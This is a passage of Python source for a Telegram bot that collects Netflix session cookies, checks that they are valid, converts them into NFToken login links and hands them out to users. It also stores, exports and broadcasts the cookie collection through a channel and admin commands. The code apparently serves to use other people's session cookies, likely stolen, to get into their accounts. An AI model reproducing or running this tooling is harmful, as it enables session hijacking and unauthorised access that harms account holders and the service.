                    f"⏳ Progress: {i}/{total_cookies}\n\n"
                    f"🔄 <b>Cookie {i}/{total_cookies}:</b> ✅ VALID - Added\n"
                    f"📂 Account: {account_name}\n"
                    f"⏳ Waiting {PROCESS_INTERVAL} seconds...",
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
            except:
                pass
            
            if i < total_cookies:
                time.sleep(PROCESS_INTERVAL)
        
        # Processing complete
        update_processing_status({
            "is_processing": False,
            "current": 0,
            "total": 0,
            "last_account": "",
            "file_name": "",
            "end_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # Create backup
        create_backup()
        
        # Final summary
        summary = "✅ <b>Processing Complete!</b>\n\n"
        summary += f"📄 <b>File:</b> {file_name}\n"
        summary += f"📊 <b>Total Cookies:</b> {total_cookies}\n"
        summary += f"✅ <b>Valid & Added:</b> {valid_count}\n"
        summary += f"❌ <b>Invalid:</b> {invalid_count}\n"
        summary += f"⚠️ <b>Duplicate:</b> {duplicate_count}\n"
        summary += f"🚫 <b>Owner ID Filtered:</b> {owner_filtered}\n\n"
        summary += f"📂 <b>Total Accounts:</b> {len(load_cookies())}\n\n"
        summary += "📢 <b>All valid cookies saved to channel!</b>"
        
        bot.edit_message_text(
            summary,
            chat_id=message.chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        add_user(user_id, username)
        
        logger.info(f"File processed: {file_name} by {username} - {valid_count} valid, {invalid_count} invalid, {duplicate_count} duplicate, {owner_filtered} owner filtered")
        
    except Exception as e:
        # Reset processing status on error
        update_processing_status({
            "is_processing": False,
            "current": 0,
            "total": 0,
            "last_account": "",
            "file_name": "",
            "error": str(e)
        })
        logger.error(f"File upload error: {e}")
        error_logger.error(f"File upload error: {e}")
        try:
            bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')
        except:
            pass

# ============================================
# 📋 HANDLE MANUAL COOKIE
# ============================================
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    """Handle manual cookie text"""
    try:
        text = message.text
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        
        if not text:
            return
        
        # Check if it's a command (skip)
        if text.startswith('/'):
            return
        
        # Check if it contains cookie data
        if 'NetflixId' in text or '.netflix.com' in text:
            msg = bot.reply_to(message, "⏳ Processing cookie...")
            
            try:
                cookie_dict = extract_cookie_dict(text)
                if not cookie_dict:
                    bot.edit_message_text("❌ Invalid cookie format!", msg.chat.id, msg.message_id)
                    return
                
                # Filter Owner ID
                if cookie_dict.get("NetflixId") == str(ADMIN_ID) or cookie_dict.get("NetflixId") == "8741623856":
                    bot.edit_message_text("🚫 Owner ID cannot be used as cookie!", msg.chat.id, msg.message_id)
                    return
                
                token, expires = fetch_nftoken(cookie_dict)
                nftoken_link = build_nftoken_link(token)
                expiry_str = format_expiry(expires)
                
                success = "✅ <b>NFToken Ready!</b>\n\n"
                success += "🔗 <b>Link:</b>\n<code>" + nftoken_link + "</code>\n\n"
                success += "⏰ <b>Expires:</b> <code>" + expiry_str + "</code>\n\n"
                success += "📢 <b>Saved in Channel!</b>"
                
                bot.edit_message_text(success, msg.chat.id, msg.message_id, parse_mode='HTML')
                add_user(user_id, username)
                
                cookie_string = f"NetflixId={cookie_dict.get('NetflixId', '')}"
                if cookie_dict.get('SecureNetflixId'):
                    cookie_string += f"; SecureNetflixId={cookie_dict.get('SecureNetflixId', '')}"
                if cookie_dict.get('nfvdid'):
                    cookie_string += f"; nfvdid={cookie_dict.get('nfvdid', '')}"
                
                save_to_channel(cookie_string, nftoken_link, expiry_str, user_id, username, "Manual Cookie")
                logger.info(f"Manual cookie by {username}")
                
            except Exception as e:
                logger.error(f"Manual cookie error: {e}")
                error_logger.error(f"Manual cookie error: {e}")
                bot.edit_message_text(f"❌ Error: {str(e)}", msg.chat.id, msg.message_id)
        else:
            # If not a command and not a cookie, show help
            bot.reply_to(message, 
                "🤔 Cookie nahi mili.\n\n"
                "📌 Use:\n"
                "• /netflix - Random NFToken\n"
                "• Send .txt file - Upload Multiple Cookies\n"
                "• Send Cookie - Manual\n\n"
                "Cookie: NetflixId=xxx; SecureNetflixId=xxx",
                parse_mode='HTML'
            )
    except Exception as e:
        logger.error(f"Message handler error: {e}")
        error_logger.error(f"Message handler error: {e}")

# ============================================
# ADMIN COMMANDS
# ============================================

@bot.message_handler(commands=['addcookie'])
@admin_only
def add_cookie_command(message):
    """Handle /addcookie command"""
    try:
        text = "📝 <b>Cookie Add karne ke liye format:</b>\n\n"
        text += "<code>/addcookie</code>\n"
        text += "<code>Account_Name</code>\n"
        text += "<code>NetflixId: value</code>\n"
        text += "<code>SecureNetflixId: value</code>\n"
        text += "<code>nfvdid: value</code>\n\n"
        text += "<b>Example:</b>\n"
        text += "<code>/addcookie</code>\n"
        text += "<code>Premium 1</code>\n"
        text += "<code>NetflixId: ct%3DBgjHlOvc...</code>\n"
        text += "<code>SecureNetflixId: v%3D3%26mac%3D...</code>\n"
        text += "<code>nfvdid: BQFmAAEBEL2s...</code>"
        
        bot.reply_to(message, text, parse_mode='HTML')
        bot.register_next_step_handler(message, process_add_cookie)
    except Exception as e:
        logger.error(f"Add cookie command error: {e}")
        error_logger.error(f"Add cookie command error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_add_cookie(message):
    """Process add cookie command"""
    try:
        lines = message.text.strip().split('\n')
        
        if len(lines) < 4:
            bot.reply_to(message, "❌ Invalid format! Use /addcookie to see correct format.")
            return
        
        account_name = lines[0].strip()
        netflix_id = None
        secure_netflix_id = None
        nfvdid = None
        
        for line in lines[1:]:
            line = line.strip()
            if line.lower().startswith('netflixid:'):
                netflix_id = line.split(':', 1)[1].strip()
            elif line.lower().startswith('securenetflixid:'):
                secure_netflix_id = line.split(':', 1)[1].strip()
            elif line.lower().startswith('nfvdid:'):
                nfvdid = line.split(':', 1)[1].strip()
        
        if not all([account_name, netflix_id, secure_netflix_id, nfvdid]):
            bot.reply_to(message, "❌ Missing values! Need: Account Name, NetflixId, SecureNetflixId, nfvdid")
            return
        
        cookie_dict = {
            "NetflixId": netflix_id,
            "SecureNetflixId": secure_netflix_id,
            "nfvdid": nfvdid
        }
        
        # Filter Owner ID
        if netflix_id == str(ADMIN_ID) or netflix_id == "8741623856":
            bot.reply_to(message, "🚫 Owner ID cannot be added as cookie!", parse_mode='HTML')
            return
        
        # Validate before saving
        is_valid, token, expires = validate_cookie(cookie_dict)
        
        if not is_valid:
            bot.reply_to(message, "❌ <b>Invalid Cookie!</b>\n\nThis cookie is expired or invalid.", parse_mode='HTML')
            return
        
        cookies = load_cookies()
        if account_name in cookies:
            account_name = f"{account_name}_{datetime.now().strftime('%H%M%S')}"
        
        cookies[account_name] = cookie_dict
        save_cookies(cookies)
        
        logger.info(f"Admin added cookie: {account_name}")
        bot.reply_to(message, f"✅ <b>Cookie Added Successfully!</b>\n\n📂 Account: {account_name}\n📌 Total Accounts: {len(cookies)}", parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Process add cookie error: {e}")
        error_logger.error(f"Process add cookie error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['listcookies'])
@admin_only
def list_cookies(message):
    """Handle /listcookies command"""
    try:
        cookies = load_cookies()
        if not cookies:
            bot.reply_to(message, "📭 No cookies found!")
            return
        
        text = "📂 <b>Saved Cookies:</b>\n\n"
        for i, (name, data) in enumerate(cookies.items(), 1):
            text += f"{i}. <b>{name}</b>\n"
            text += f"   • NetflixId: <code>{data.get('NetflixId', '')[:30]}...</code>\n"
            text += f"   • SecureNetflixId: <code>{data.get('SecureNetflixId', '')[:30]}...</code>\n"
            text += f"   • nfvdid: <code>{data.get('nfvdid', '')[:30]}...</code>\n\n"
        
        text += f"📌 <b>Total:</b> {len(cookies)} accounts"
        
        send_long_message(message.chat.id, text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"List cookies error: {e}")
        error_logger.error(f"List cookies error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['removecookie'])
@admin_only
def remove_cookie(message):
    """Handle /removecookie command"""
    try:
        cookies = load_cookies()
        if not cookies:
            bot.reply_to(message, "📭 No cookies found!")
            return
        
        text = "🗑️ <b>Remove Cookie:</b>\n\nSend the exact account name to delete:\n\n"
        for name in cookies.keys():
            text += f"• <code>{name}</code>\n"
        
        bot.reply_to(message, text, parse_mode='HTML')
        bot.register_next_step_handler(message, process_remove_cookie)
    except Exception as e:
        logger.error(f"Remove cookie error: {e}")
        error_logger.error(f"Remove cookie error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_remove_cookie(message):
    """Process remove cookie"""
    try:
        account_name = message.text.strip()
        cookies = load_cookies()
        
        if account_name not in cookies:
            bot.reply_to(message, f"❌ Account <code>{account_name}</code> not found!", parse_mode='HTML')
            return
        
        del cookies[account_name]
        save_cookies(cookies)
        
        logger.info(f"Admin removed cookie: {account_name}")
        bot.reply_to(message, f"✅ Account <code>{account_name}</code> deleted successfully!", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Process remove cookie error: {e}")
        error_logger.error(f"Process remove cookie error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """Handle /stats command (public)"""
    try:
        cookies = load_cookies()
        users = load_json(USERS_FILE, {})
        status = get_processing_status()
        
        text = "📊 <b>Bot Statistics:</b>\n\n"
        text += f"📂 <b>Total Accounts:</b> {len(cookies)}\n"
        text += f"👤 <b>Total Users:</b> {len(users)}\n"
        text += f"📢 <b>Channel ID:</b> {CHANNEL_ID}\n"
        text += f"🤖 <b>Bot Status:</b> Active ✅\n"
        text += f"⏰ <b>Uptime:</b> {get_uptime()}\n"
        text += f"💾 <b>Memory Usage:</b> {get_memory_usage()}\n\n"
        
        if status.get("is_processing", False):
            text += "🔄 <b>Processing Status:</b>\n"
            text += f"   • Progress: {status.get('current', 0)}/{status.get('total', 0)}\n"
            text += f"   • File: {status.get('file_name', 'Unknown')}\n"
            text += f"   • Last Account: {status.get('last_account', 'None')}\n\n"
        
        text += "📌 <b>Commands:</b>\n"
        text += "   /netflix - Random Token\n"
        text += "   /addcookie - Add Cookie (Admin)\n"
        text += "   /listcookies - List All (Admin)\n"
        text += "   /removecookie - Remove Cookie (Admin)\n"
        text += "   /stats - This Message\n"
        text += "   /broadcast - Broadcast Message (Admin)\n"
        text += "   /users - List All Users (Admin)\n"
        text += "   /cleancookies - Clean Invalid Cookies (Admin)\n"
        text += "   /exportcookies - Export Cookies (Admin)\n"
        text += "   /backup - Create Backup (Admin)\n"
        text += "   /health - Health Check\n"
        
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Stats error: {e}")
        error_logger.error(f"Stats error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['health'])
def health_check(message):
    """Handle /health command"""
    try:
        text = "🟢 <b>Health Check</b>\n\n"
        text += f"✅ <b>Status:</b> Healthy\n"
        text += f"⏰ <b>Uptime:</b> {get_uptime()}\n"
        text += f"💾 <b>Memory:</b> {get_memory_usage()}\n"
        text += f"📂 <b>Accounts:</b> {len(load_cookies())}\n"
        text += f"👤 <b>Users:</b> {len(load_json(USERS_FILE, {}))}\n"
        text += f"📢 <b>Channel:</b> {CHANNEL_ID}\n"
        text += f"🤖 <b>Bot ID:</b> {bot.get_me().id}\n"
        text += f"🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Health check error: {e}")
        error_logger.error(f"Health check error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['users'])
@admin_only
def list_users(message):
    """Handle /users command"""
    try:
        users = load_json(USERS_FILE, {})
        if not users:
            bot.reply_to(message, "👤 No users found!")
            return
        
        text = "👤 <b>Users List:</b>\n\n"
        for i, (user_id, data) in enumerate(users.items(), 1):
            text += f"{i}. <b>{data.get('username', 'Unknown')}</b>\n"
            text += f"   • ID: <code>{user_id}</code>\n"
            text += f"   • First Seen: {data.get('first_seen', 'Unknown')}\n"
            text += f"   • Tokens: {data.get('tokens_generated', 0)}\n\n"
        
        text += f"📌 <b>Total Users:</b> {len(users)}"
        
        send_long_message(message.chat.id, text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"List users error: {e}")
        error_logger.error(f"List users error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['broadcast'])
@admin_only
def broadcast_message(message):
    """Handle /broadcast command"""
    try:
        bot.reply_to(message, "📝 <b>Send the message you want to broadcast:</b>\n\n(Reply with the message)", parse_mode='HTML')
        bot.register_next_step_handler(message, process_broadcast)
    except Exception as e:
        logger.error(f"Broadcast error: {e}")
        error_logger.error(f"Broadcast error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_broadcast(message):
    """Process broadcast"""
    try:
        broadcast_text = message.text
        users = load_json(USERS_FILE, {})
        
        if not users:
            bot.reply_to(message, "❌ No users found to broadcast!")
            return
        
        success_count = 0
        fail_count = 0
        
        status_msg = bot.reply_to(message, f"⏳ Broadcasting to {len(users)} users...")
        
        for user_id in users.keys():
            try:
                bot.send_message(
                    int(user_id),
                    f"📢 <b>Broadcast Message:</b>\n\n{broadcast_text}\n\n---\n🔹 Powered by Netflix NFT Bot",
                    parse_mode='HTML'
                )
                success_count += 1
                time.sleep(0.2)
            except:
                fail_count += 1
        
        logger.info(f"Broadcast sent to {success_count} users, failed: {fail_count}")
        
        bot.edit_message_text(
            f"✅ <b>Broadcast Complete!</b>\n\n"
            f"📨 <b>Sent:</b> {success_count} users\n"
            f"❌ <b>Failed:</b> {fail_count} users\n"
            f"📩 <b>Message:</b>\n{broadcast_text}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Process broadcast error: {e}")
        error_logger.error(f"Process broadcast error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['cleancookies'])
@admin_only
def clean_cookies(message):
    """Handle /cleancookies command"""
    try:
        status_msg = bot.reply_to(message, "⏳ Cleaning invalid cookies...")
        cookies = load_cookies()
        invalid = []
        valid_count = 0
        
        for account_name, account_data in cookies.items():
            cookie_dict = {
                "NetflixId": account_data.get("NetflixId", ""),
                "SecureNetflixId": account_data.get("SecureNetflixId", ""),
                "nfvdid": account_data.get("nfvdid", "")
            }
            is_valid, _, _ = validate_cookie(cookie_dict)
            if not is_valid:
                invalid.append(account_name)
            else:
                valid_count += 1
        
        if invalid:
            for name in invalid:
                if name in cookies:
                    del cookies[name]
            save_cookies(cookies)
            
            invalid_list = "\n".join(invalid[:20])
            if len(invalid) > 20:
                invalid_list += f"\n... and {len(invalid)-20} more"
            
            bot.edit_message_text(
                f"🗑️ <b>Cleaned {len(invalid)} invalid cookies!</b>\n\n"
                f"✅ <b>Valid Cookies:</b> {valid_count}\n"
                f"❌ <b>Invalid Cookies:</b> {len(invalid)}\n\n"
                f"<b>Removed:</b>\n{invalid_list}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
        else:
            bot.edit_message_text(
                f"✅ <b>All cookies are valid!</b>\n\n"
                f"📂 <b>Total Accounts:</b> {len(cookies)}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
        
        logger.info(f"Cleaned {len(invalid)} invalid cookies")
    except Exception as e:
        logger.error(f"Clean cookies error: {e}")
        error_logger.error(f"Clean cookies error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['exportcookies'])
@admin_only
def export_cookies(message):
    """Handle /exportcookies command"""
    try:
        cookies = load_cookies()
        if not cookies:
            bot.reply_to(message, "📭 No cookies to export!")
            return
        
        # Create export text
        export_text = "# Netflix Cookies Export\n"
        export_text += f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        export_text += f"# Total: {len(cookies)} accounts\n\n"
        
        for name, data in cookies.items():
            export_text += f"[{name}]\n"
            export_text += f"NetflixId={data.get('NetflixId', '')}\n"
            export_text += f"SecureNetflixId={data.get('SecureNetflixId', '')}\n"
            export_text += f"nfvdid={data.get('nfvdid', '')}\n\n"
        
        # Save to temp file
        export_file = f"cookies_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(export_file, 'w', encoding='utf-8') as f:
            f.write(export_text)
        
        # Send file
        with open(export_file, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"📂 <b>Cookies Export</b>\n\n"
                        f"📌 <b>Total:</b> {len(cookies)} accounts\n"
                        f"⏰ <b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='HTML'
            )
        
        # Clean up
        os.remove(export_file)
        logger.info(f"Exported {len(cookies)} cookies")
        
    except Exception as e:
        logger.error(f"Export cookies error: {e}")
        error_logger.error(f"Export cookies error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['backup'])
@admin_only
def create_backup_command(message):
    """Handle /backup command"""
    try:
        status_msg = bot.reply_to(message, "⏳ Creating backup...")
        
        success = create_backup()
        
        if success:
            # Send backup file
            with open(BACKUP_FILE, 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📦 <b>Backup Created</b>\n\n"
                            f"⏰ <b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                            f"📂 <b>Files:</b> cookies.json, users.json, processing.json",
                    parse_mode='HTML'
                )
            
            bot.edit_message_text(
                "✅ <b>Backup Created Successfully!</b>\n\n"
                f"📦 <b>File:</b> {BACKUP_FILE}\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            logger.info(f"Backup created by admin")
        else:
            bot.edit_message_text(
                "❌ <b>Backup Failed!</b>\n\nPlease check logs for more details.",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Backup command error: {e}")
        error_logger.error(f"Backup command error: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ============================================
# ERROR HANDLERS
# ============================================
@bot.message_handler(func=lambda message: True, content_types=['text', 'document'])
def handle_all_errors(message):
    """Global error handler for all messages"""
    try:
        # If message is a document but not processed, handle it
        if message.document:
            handle_document(message)
            return
        
        # If message is text and not a command, handle it
        if message.text and not message.text.startswith('/'):
            handle_message(message)
            return
            
    except Exception as e:
        logger.error(f"Global error handler: {e}")
        error_logger.error(f"Global error handler: {e}")
        try:
            bot.reply_to(message, f"❌ Error: {str(e)}")
        except:
            pass

# ============================================
# BOT RUN
# ============================================
def main():
    """Main function to run the bot"""
    try:
        print("=" * 60)
        print("🤖 NETFLIX NFT BOT - POWERFUL EDITION")
        print("=" * 60)
        print(f"📢 Channel ID: {CHANNEL_ID}")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"⏰ Process Interval: {PROCESS_INTERVAL}s")
        print(f"🔄 Max Retries: {MAX_RETRIES}")
        print("=" * 60)
        print(WATERMARK)
        print("=" * 60)
        
        cookies = load_cookies()
        users = load_json(USERS_FILE, {})
        print(f"📂 Total Accounts: {len(cookies)}")
        print(f"👤 Total Users: {len(users)}")
        print("=" * 60)
        print("\n📌 Commands:")
        print("   /start - Welcome Message")
        print("   /netflix - Random Token")
        print("   /addcookie - Add Cookie (Admin)")
        print("   /listcookies - List All Cookies (Admin)")
        print("   /removecookie - Remove Cookie (Admin)")
        print("   /stats - Bot Statistics")
        print("   /users - List All Users (Admin)")
        print("   /broadcast - Broadcast Message (Admin)")
        print("   /cleancookies - Clean Invalid Cookies (Admin)")
        print("   /exportcookies - Export Cookies (Admin)")
        print("   /backup - Create Backup (Admin)")
        print("   /health - Health Check")
        print("   Send .txt file - Upload & Validate Multiple Cookies")
        print("=" * 60)
        print("✅ Bot Started Successfully!")
        print("=" * 60)
        
        # Start bot with retry logic
        retry_count = 0
        while retry_count < MAX_RETRIES:
            try:
                bot.infinity_polling(timeout=120)
                break
            except Exception as e:
                retry_count += 1
                logger.error(f"Bot polling error (attempt {retry_count}/{MAX_RETRIES}): {e}")
                error_logger.error(f"Bot polling error (attempt {retry_count}/{MAX_RETRIES}): {e}")
                print(f"🔄 Reconnecting in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
                
                if retry_count >= MAX_RETRIES:
                    logger.critical("Max retries reached. Bot is stopping.")
                    error_logger.critical("Max retries reached. Bot is stopping.")
                    print("❌ Max retries reached. Bot is stopping.")
                    sys.exit(1)
                
    except KeyboardInterrupt:
        print("\n⏹️ Bot stopped by user")
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.critical(f"Fatal error in main: {e}")
        error_logger.critical(f"Fatal error in main: {e}")
        print(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()